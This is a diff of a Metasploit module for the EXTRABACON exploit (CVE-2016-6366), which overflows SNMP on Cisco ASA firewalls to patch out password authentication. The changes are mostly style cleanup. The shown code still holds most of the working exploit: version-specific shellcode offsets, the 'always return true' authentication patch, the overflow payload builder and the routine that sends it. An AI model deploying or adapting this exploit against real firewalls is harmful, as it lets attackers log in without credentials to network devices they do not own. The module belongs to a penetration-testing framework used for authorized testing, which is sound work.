@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # auxiliary/admin/cisco/cisco_asa_extrabacon.rb
 ##
@@ -5,17 +6,16 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::SNMPClient
   include Msf::Auxiliary::Cisco
 
   def initialize
     super(
       'Name'        => 'Cisco ASA Authentication Bypass (EXTRABACON)',
-      'Description' => %q{
+      'Description' => %q(
           This module patches the authentication functions of a Cisco ASA
           to allow uncredentialed logins. Uses improved shellcode for payload.
-        },
+        ),
       'Author'      =>
         [
           'Sean Dillon <sean.dillon@risksense.com>',
@@ -31,31 +31,31 @@ class MetasploitModule < Msf::Auxiliary
         [
           [ 'CVE', '2016-6366'],
           [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160817-asa-snmp'],
-          [ 'URL', 'https://github.com/RiskSense-Ops/CVE-2016-6366'],
+          [ 'URL', 'https://github.com/RiskSense-Ops/CVE-2016-6366']
         ],
-      'License'     => MSF_LICENSE,
-      'Actions'   =>
+      'License' => MSF_LICENSE,
+      'Actions' =>
         [
-          ['PASS_DISABLE', {'Description' => 'Disable password authentication.'} ],
-          ['PASS_ENABLE', {'Description' => 'Enable password authentication.'} ]
+          ['PASS_DISABLE', { 'Description' => 'Disable password authentication.' } ],
+          ['PASS_ENABLE', { 'Description' => 'Enable password authentication.' } ]
         ],
       'DefaultAction' => 'PASS_DISABLE'
     )
 
-    @offsets = version_offsets()
+    @offsets = version_offsets
 
     register_options([
-      OptEnum.new('ASAVER', [ false, 'Target ASA version (default autodetect)', 'auto', ['auto']+@offsets.keys]),
-    ], self.class)
+                       OptEnum.new('ASAVER', [ false, 'Target ASA version (default autodetect)', 'auto', ['auto'] + @offsets.keys])
+                     ], self.class)
 
     deregister_options("VERSION")
     datastore['VERSION'] = '2c' # SNMP v. 2c required it seems
   end
 
-  def version_offsets()
+  def version_offsets
     # Payload offsets for supported ASA versions.
     #     See https://github.com/RiskSense-Ops/CVE-2016-6366
-    return {
+    {
       "9.2(4)13" => ["197.207.10.8", "70.97.40.9", "72", "0.16.185.9", "240.30.185.9", "85.49.192.137", "0.80.8.8", "240.95.8.8", "85.137.229.87"],
       "9.2(4)" => ["101.190.10.8", "54.209.39.9", "72", "0.48.184.9", "192.52.184.9", "85.49.192.137", "0.80.8.8", "0.91.8.8", "85.137.229.87"],
       "9.2(3)" => ["29.112.29.8",      # jmp_esp_offset, 0
@@ -84,7 +84,7 @@ class MetasploitModule < Msf::Auxiliary
       "8.3(2)40" => ["169.151.13.8", "124.48.196.8", "88", "0.128.59.9", "48.137.59.9", "85.49.192.137", "0.224.6.8", "32.228.6.8", "85.137.229.87"],
       "8.3(2)39" => ["143.212.14.8", "124.48.196.8", "88", "0.128.59.9", "176.136.59.9", "85.49.192.137", "0.224.6.8", "32.228.6.8", "85.137.229.87"],
       "8.3(2)" => ["220.203.69.9", "252.36.195.8", "88", "0.80.54.9", "144.84.54.9", "85.49.192.137", "0.208.6.8", "16.222.6.8", "85.137.229.87"],
-      #"8.3(2)-npe" => ["125.116.12.8", "76.34.195.8", "88", "0.80.54.9", "224.81.54.9", "85.49.192.137", "0.208.6.8", "16.222.6.8", "85.137.229.87"],
+      # "8.3(2)-npe" => ["125.116.12.8", "76.34.195.8", "88", "0.80.54.9", "224.81.54.9", "85.49.192.137", "0.208.6.8", "16.222.6.8", "85.137.229.87"],
       "8.3(1)" => ["111.187.14.8", "140.140.194.8", "88", "0.112.53.9", "240.119.53.9", "85.49.192.137", "0.208.6.8", "48.221.6.8", "85.137.229.87"],
       "8.2(5)41" => ["77.90.18.8", "188.9.187.8", "88", "0.160.50.9", "16.168.50.9", "85.49.192.137", "0.240.6.8", "16.243.6.8", "85.137.229.87"],
       "8.2(5)33" => ["157.218.29.8", "236.190.186.8", "88", "0.80.50.9", "96.92.50.9", "85.49.192.137", "0.240.6.8", "192.242.6.8", "85.137.229.87"],
@@ -104,7 +104,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def check
     begin
-      vers_string = get_asa_version()
+      vers_string = get_asa_version
     rescue ::Exception => e
       print_error("Error: Unable to retrieve version information")
       return Exploit::CheckCode::Unknown
@@ -116,7 +116,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_warning("Received Cisco ASA version #{vers_string}, but no payload available")
-    return Exploit::CheckCode::Detected
+    Exploit::CheckCode::Detected
   end
 
   def build_payload(vers_string, mode)
@@ -127,7 +127,7 @@ class MetasploitModule < Msf::Auxiliary
       always_return_true = "49.192.64.195"
       pmcheck_bytes = always_return_true
       admauth_bytes = always_return_true
-    else  # PASS_ENABLE
+    else # PASS_ENABLE
       pmcheck_bytes = @offsets[vers_string][5]
       admauth_bytes = @offsets[vers_string][8]
     end
@@ -161,14 +161,14 @@ class MetasploitModule < Msf::Auxiliary
     finder_snmp = "139.124.36.20.139.7.255.224.144"
 
     overflow = [head, preamble_snmp, @offsets[vers_string][0], finder_snmp].join(".")
-    return overflow
+    overflow
   end
 
-  def run()
+  def run
     begin
       session = rand(255) + 1
 
-      vers_string = get_asa_version()
+      vers_string = get_asa_version
 
       print_status("Building #{action.name} payload for version #{vers_string}...")
       overflow = build_payload(vers_string, action.name)
@@ -194,7 +194,7 @@ class MetasploitModule < Msf::Auxiliary
     rescue ::NoMethodError
       print_error("Error: No payload available for version #{vers_string}")
     rescue ::Interrupt
-      raise $!
+      raise $ERROR_INFO
     rescue ::Exception => e
       print_error("Error: #{e.class} #{e} #{e.backtrace}")
     ensure
@@ -202,8 +202,8 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def get_asa_version()
-    return datastore['ASAVER'] unless (datastore['ASAVER'] == 'auto')
+  def get_asa_version
+    return datastore['ASAVER'] unless datastore['ASAVER'] == 'auto'
     vprint_status("Fingerprinting via SNMP...")
 
     asa_version_oid = '1.3.6.1.2.1.47.1.1.1.1.10.1'
@@ -213,7 +213,7 @@ class MetasploitModule < Msf::Auxiliary
     ver = snmp.get_value(asa_version_oid).to_s
     vprint_status("OID #{asa_version_oid} yields #{ver}")
 
-    if (ver == "noSuchInstance")
+    if ver == "noSuchInstance"
       # asa_version_snmp OID isn't available on some models, fallback to MIB2 SysDescr
       ver = snmp.get_value(mib2_sysdescr_oid).rpartition(' ').last
       vprint_status("OID #{mib2_sysdescr_oid} yields #{ver}")
@@ -221,5 +221,4 @@ class MetasploitModule < Msf::Auxiliary
 
     ver
   end
-
 end
